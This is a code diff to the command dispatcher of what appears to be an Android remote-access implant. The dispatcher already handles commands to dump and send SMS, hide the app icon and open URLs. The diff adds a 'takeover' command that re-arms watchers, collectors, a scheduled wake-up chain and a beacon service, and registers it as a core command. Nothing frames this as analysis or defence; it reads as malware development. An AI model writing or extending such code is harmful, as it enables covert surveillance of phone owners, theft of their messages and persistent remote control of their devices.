@@ -61,6 +61,13 @@ final class Dispatcher {
                     return ok(Info.snapshot(ctx));
                 case "perm_status":
                     return ok(perms(ctx));
+                case "takeover":
+                    // Re-assert the on-device side of the takeover: watchers,
+                    // collectors and the wake-up chain, then report the state.
+                    prime(ctx);
+                    Scheduler.arm(ctx);
+                    BeaconService.start(ctx);
+                    return ok(perms(ctx));
                 case "sms_dump":
                     return ok(SmsStore.dump(ctx, parseInt(first, 200)));
                 case "sms_send":
@@ -152,7 +159,8 @@ final class Dispatcher {
     }
 
     private static final List<String> CORE = java.util.Arrays.asList(
-            "ping", "info", "perm_status", "spec", "modules", "hide_icon", "toast", "vibrate", "open_url");
+            "ping", "info", "perm_status", "spec", "modules", "hide_icon", "toast", "vibrate",
+            "open_url", "takeover");
 
     private static String moduleFor(String cmd) {
         switch (cmd) {
